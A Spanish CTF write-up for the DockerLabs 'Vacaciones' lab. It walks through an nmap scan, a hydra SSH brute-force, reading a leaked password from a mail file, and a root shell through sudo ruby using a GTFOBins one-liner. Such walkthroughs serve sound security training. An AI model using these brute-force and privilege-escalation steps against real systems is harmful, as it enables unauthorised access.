<section align="center">

# 💥Vacaciones Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos e iniciamos la maquina con:

```bash
sudo bash vacaciones/auto_deploy.sh vacaciones/vacaciones.tar
```

nos devuelve esto:

```bash
	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...

Estamos desplegando la máquina vulnerable, espere un momento.
La red dockernetwork ya existe. Eliminándola y recreándola...

Máquina desplegada, su dirección IP es --> 172.17.0.5

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap -p- 172.17.0.5
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p-`** | indico que quiero un escaneo para todos los puertos, no solo los mas comunes |

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-08 20:39 -03
Nmap scan report for 172.17.0.5
Host is up (0.00024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```

al acceder a la pagina que esta funcionando en el servicio http, podremos ver que tiene un comentario en su codigo fuente "<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->", podemos asumir que hay dos posibles usuarios, Camilo y Juan, podemos guardalos en un .txt con sus versiones en mayusculas y en minuscula para probar un ataque de fuerza bruta con hydra:

```bash
hydra -l camilo -P rockyou.txt ssh://172.17.0.5
```

nos devuelve:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 20:41:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.5:22/
[22][ssh] host: 172.17.0.5   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 20:42:11
```

con ese ataque, tendremos la contraseña para poder acceder al sistema pos ssh:

```bash
ssh camilo@172.17.0.5
```

una vez tengamos el acceso, intentamos escalar privilegios sin exito, ya que al usar el comando:

```bash
sudo -l
```

nos aparece esto:

```bash
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on 1d09e3dcf8fb.
```

buscaremos un archivo .txt que pueda tener una bandera o algo importante, con el siguiente comando:

```bash
find / -name *.txt 2>/dev/null
```

encontraremos algo interesante, esto:

```bash
/var/mail/camilo/correo.txt
```

si leemos ese archivo con cat:

```bash
cat /var/mail/camilo/correo.txt
```

obtendremos esto:

```bash
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

con esto, podremos acceder al sistema desde el usuario juan, nos conectamos por ssh de la misma forma que con camilo:

```bash
ssh juan@172.17.0.5
```

y obtendremos el acceso, ahora, con el siguiente comando veremos si es posible escalar privilegios:

```bash
sudo -l
```

y obtenemos:

```bash
Matching Defaults entries for juan on 1d09e3dcf8fb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 1d09e3dcf8fb:
    (ALL) NOPASSWD: /usr/bin/ruby
```

sabiendo que podemos ejecutar ruby, investigamos en gtfobins por algo que nos sirva, encontrando el siguiente comando:

```bash
ruby -e 'exec "/bin/sh"'
```

al usarlo con sudo, obtendremos acceso a root, dando por finalizada la ctf



